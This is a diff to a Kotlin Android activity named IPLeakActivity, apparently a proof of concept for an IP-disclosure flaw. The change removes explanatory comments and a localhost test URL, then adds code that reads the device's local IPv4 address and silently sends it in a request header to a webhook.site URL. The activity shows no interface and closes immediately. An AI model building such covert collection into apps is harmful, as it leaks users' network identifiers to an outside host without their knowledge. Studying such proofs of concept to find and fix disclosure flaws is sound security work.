@@ -3,9 +3,11 @@ package com.example.securevaultipdisclosure
 import android.os.Bundle
 import android.util.Log
 import androidx.appcompat.app.AppCompatActivity
-import java.io.OutputStreamWriter
 import java.net.HttpURLConnection
+import java.net.Inet4Address
+import java.net.NetworkInterface
 import java.net.URL
+import java.util.Collections
 import kotlin.concurrent.thread
 
 class IPLeakActivity : AppCompatActivity() {
@@ -13,39 +15,54 @@ class IPLeakActivity : AppCompatActivity() {
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
 
-        // This activity has no UI, so we don't need to set a content view.
-        // It simply performs an action and exits.
-
-        // The URL for the server that will receive the IP address.
-        // You can use a service like "webhook.site" to test this.
-        // **IMPORTANT**: Replace this with your own URL to see the results.
-        val webhookUrl = "http://127.0.0.1:8080"
-
-        Log.e("IPLeakActivity", "Vulnerability triggered! Attempting to send IP to $webhookUrl")
-
-        // Perform the network request in a new thread, as network operations are not allowed on the main thread.
+        val webhookUrl = "https://webhook.site/134ed5a9-b002-4fac-a475-d2e1c43440da"
         thread {
             try {
-                // Open a connection to the specified URL.
+                val ipAddress = getLocalIpAddress()
+
                 val url = URL(webhookUrl)
                 val connection = url.openConnection() as HttpURLConnection
                 connection.requestMethod = "GET"
-                // Connect to the server. The act of making this connection sends the user's IP address.
+
+                if (ipAddress != null) {
+                    connection.setRequestProperty("X-IP-Address", ipAddress)
+                    Log.e("IPLeakActivity", "Sending IP address in header: $ipAddress")
+                } else {
+                    Log.e("IPLeakActivity", "Could not retrieve IP address.")
+                }
+
                 val responseCode = connection.responseCode
                 Log.e("IPLeakActivity", "Network request completed with response code: $responseCode")
 
-                // You can optionally read the response, but for this vulnerability, the request itself is the payload.
                 connection.inputStream.close()
                 connection.disconnect()
 
             } catch (e: Exception) {
-                // Log any errors that occur during the network request.
-                Log.e("IPLeakActivity", "wikwiiiiiik", e)
                 Log.e("IPLeakActivity", "Failed to send IP address", e)
             }
 
-            // Immediately finish the activity so the user doesn't see a blank screen.
             finish()
         }
+    }
+
+    /**
+     * Gets the device's local IP address.
+     * This method iterates through network interfaces to find a valid IPv4 address.
+     */
+    private fun getLocalIpAddress(): String? {
+        try {
+            val interfaces = Collections.list(NetworkInterface.getNetworkInterfaces())
+            for (intf in interfaces) {
+                val addrs = Collections.list(intf.inetAddresses)
+                for (addr in addrs) {
+                    if (!addr.isLoopbackAddress && addr is Inet4Address) {
+                        return addr.hostAddress
+                    }
+                }
+            }
+        } catch (ex: Exception) {
+            Log.e("IPLeakActivity", "Error getting local IP address", ex)
+        }
+        return null
     }
 }
